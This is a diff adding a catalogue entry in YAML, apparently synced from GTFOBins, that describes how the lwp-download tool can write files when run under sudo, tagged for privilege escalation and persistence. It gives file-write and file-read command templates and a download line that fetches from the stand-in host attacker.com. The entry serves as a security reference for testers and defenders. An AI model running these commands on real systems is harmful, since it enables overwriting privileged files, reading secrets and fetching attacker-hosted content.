@@ -1,0 +1,99 @@
+id: gtfobins/lwp-download/file-write/sudo
+type: binary
+platform: linux
+name: lwp-download
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'echo DATA >/path/to/temp-file
+
+    lwp-download file:///path/to/temp-file /path/to/output-file'
+- template: lwp-download file:///path/to/input-file /path/to/output-file
+  comment: This actually copies a file to a destination.
+references:
+- https://gtfobins.github.io/gtfobins/lwp-download/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        lwp-download:
+          functions:
+            download:
+            - code: lwp-download http://attacker.com/path/to/input-file /path/to/output-file
+              comment: The destination file `/path/to/output-file` can be omitted, in that case the file
+                is saved to `input-file` in the current working directory.
+              contexts:
+                sudo: null
+                unprivileged: null
+            file-read:
+            - code: lwp-download file:///path/to/input-file /dev/stdout
+              contexts:
+                sudo: null
+                unprivileged: null
+            file-write:
+            - code: 'echo DATA >/path/to/temp-file
+
+                lwp-download file:///path/to/temp-file /path/to/output-file'
+              contexts:
+                sudo: null
+                unprivileged: null
+            - code: lwp-download file:///path/to/input-file /path/to/output-file
+              comment: This actually copies a file to a destination.
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/lwp-download/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-write
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:69f191364a2b823c56823de244735fe6e9e48a7772d312518cfe0f45a0ace6cf
